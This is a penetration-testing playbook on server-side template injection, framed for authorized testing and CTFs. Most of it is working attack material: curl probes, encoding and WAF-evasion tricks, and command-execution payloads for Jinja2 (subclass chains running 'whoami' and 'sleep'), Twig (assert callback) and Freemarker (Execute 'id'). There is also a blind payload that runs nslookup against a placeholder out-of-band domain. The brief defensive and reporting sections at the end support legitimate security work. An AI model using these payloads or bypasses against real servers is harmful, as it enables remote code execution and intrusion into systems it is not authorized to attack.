# SSTI Bypass Checklist — Practical Playbook & PoC (English, professional, no fluff)

**Scope & warning:** for authorized testing, CTFs or staging only. Do not use against production systems without explicit permission. This is a tactical checklist: how to detect SSTI, how to bypass basic filters, engine‑specific pivoting, OOB (blind) verification, and minimal PoCs (curl/Burp).

---

## Quick goal

* Detect whether user input is evaluated by a template engine (SSTI).
* If evaluated, escalate from information‑disclosure to remote execution or OOB confirmation.
* If blocked, apply layered bypasses (encoding, obfuscation, alternative syntax, chaining).
* Produce a minimal, reproducible PoC and notes for developers.

---

## 1) Identify candidate template engines (fast)

Send simple expression markers and check response for evaluated result:

```
{{7*7}}
${7*7}
#{7*7}
[% 7*7 %]
```

**PoC (curl):**

```bash
curl -s -X POST "https://target/app" -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}' | grep -E "49"
```

If `49` appears → likely SSTI. If input is reflected literally, try bypasses below.

---

## 2) Baseline info collection

* Capture raw request/response (headers + body).
* Test multiple injection points: URL params, POST body, headers, cookies, JSON fields, form fields.
* Note output context: HTML, JSON escaped, attribute, JavaScript context—this affects payload choice.

---

## 3) Simple probe progression

* Test `{{7*7}}`.
* If blocked, try whitespace/comment variants: `{{ 7 * 7 }}`, `{{7*7 #}}`.
* Try alternative delimiters for other engines: `${7*7}`, `[%7*7%]`.
* Try nested: `{{ "{{7*7}}" }}` (may reveal double‑evaluation).

---

## 4) Encoding & obfuscation tricks

* URL encode: `%7b%7b7*7%7d%7d`
* Double encode: `%253b%253b7*7%253b%253b`
* Unicode escape / normalization: `\u007b\u007b7*7\u007d\u007d` or use lookalikes.
* Mixed encoding: encode only critical chars so some filters miss them.

**PoC (curl, URL encoded):**

```bash
curl -s -X POST "https://target/app" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "q=%7b%7b7*7%7d%7d"
```

---

## 5) Alternative syntax & comment tricks

* Vary whitespace: `{{ 7 * 7 }}` vs `{{7*7}}`
* Add inline comments: `{{7*7 # comment}}`
* Use expression concatenation: `{{ '' + '7'*1 + '' }}` (breaks some regex WAFs)
* Try slicing/filter constructs: `{{ var|slice(0,1) }}`

---

## 6) WAF / blacklist evasion techniques

* Break keywords: `e` + `x` + `e` + `c` instead of `exec`.
* Use unicode homoglyphs or mixed encodings.
* Fragment function names or inject comments inside names: `{{c/*x*/alc(1)}}` (where applicable).
* Try dot traversal variants: `{{...}}` vs `{{..}}` to bypass simple regexes.

---

## 7) Template‑specific quick techniques (engine hints & PoCs)

> Use these only in lab. Index numbers in subclass chains vary by environment; these are examples.

**Jinja2 (Python)**

* Enumerate classes:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

* Execute shell (may require correct index):

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[40]('whoami', shell=True) }}
```

* Delay (blind):

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[40]('sleep 5', shell=True) }}
```

**Twig (PHP)**

* Try filter registration / assert:

```twig
{{ _self.env.registerUndefinedFilterCallback('assert')|assert('phpinfo()') }}
```

**Freemarker (Java)**

* Execute system command:

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 8) Sandbox escape & object traversal

* Use `__class__`, `__mro__`, `__subclasses__()` (Python) to find exploitable class implementing `Popen` or `os.system`.
* Traverse chains: `().__class__.__mro__` → find subclass list → pick index to execute.

**Important:** index numbers vary. Use info‑disclosure errors to find correct index.

---

## 9) Blind / OOB verification (recommended for noisy/blocked targets)

* Use time delays to detect execution when output is not returned: `sleep 5`.
* Use DNS OOB (interactsh / Burp Collaborator) to detect external resolution: call `nslookup attacker.oob.domain` or use a command that triggers an outbound DNS resolution.

**OOB PoC concept (Jinja example):**

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[132]('nslookup YOUR_INTERACT_DOMAIN', shell=True) }}
```

Replace `YOUR_INTERACT_DOMAIN` with your interactsh/BurpCollab.

---

## 10) Error‑based reconnaissance

* Force errors to leak internal class names and indices: call non‑existing attributes or raise exceptions intentionally.
* Example: `{{ config.nonexistent }}` may reveal tracebacks containing useful details.

---

## 11) Polyglot & chaining techniques

* Combine encodings + comments + nested templates.
* Polyglot example: `{{77}}//{{77}}` — may slip through layered filters.
* Chain decoding flows: percent‑encode parts, then use comments to bypass blocklists.

---

## 12) Minimal PoC workflow (reproducible)

1. **Detect:** POST `{{7*7}}` to injection point. If response contains `49`, proceed.
2. **Enumerate:** request `{{''.__class__.__mro__[1].__subclasses__()}}` or engine‑specific introspection to locate execution vector.
3. **Test exec (lab only):** run `whoami` or small command; if no output, use blind OOB.
4. **Reduce:** reduce payload to the minimal sequence that produces result. Save raw request/response for reporting.

---

## 13) Practical curl PoCs (safe & conceptual)

**Reflection probe:**

```bash
curl -s -X POST "https://target/app" -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}'
```

**URL encoded probe:**

```bash
curl -s -X POST "https://target/app" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "search=%7b%7b7*7%7d%7d"
```

**OOB timing concept (replace index and domain appropriately):**

```bash
curl -s -X POST "https://target/app" -H "Content-Type: application/json" \
  -d '{"name":"{{ ''.__class__.__mro__[1].__subclasses__()[132]("sleep 5", shell=True) }}"}' -w "%{time_total}\n"
```

If `time_total` increases significantly, execution likely occurred.

---

## 14) Defensive notes (what devs should do)

* Never render raw user input as a template. If templates are required, do not allow user‑supplied template text.
* Use sandboxed template environments (e.g., `jinja2.sandbox.SandboxedEnvironment`) with strict filters and no access to `__class__`/subclasses.
* Escape user input appropriate to context (HTML/JS/JSON).
* Remove or disable dangerous template functions (`eval`, `exec`, system utilities).
* Apply input normalization and WAF rules, but don’t rely on WAF only—fix the root cause.

---

## 15) Reporting essentials (what to include in PoC)

* Raw request that triggers evaluated output (full headers + body).
* Raw response showing evaluated result, or OOB evidence (DNS hit timestamp).
* Minimal payload that reproduces the behavior.
* Engine guess and the exact step that escalates to code execution (if applicable).
* Suggested remediation (disable user templates, sandbox, escape).
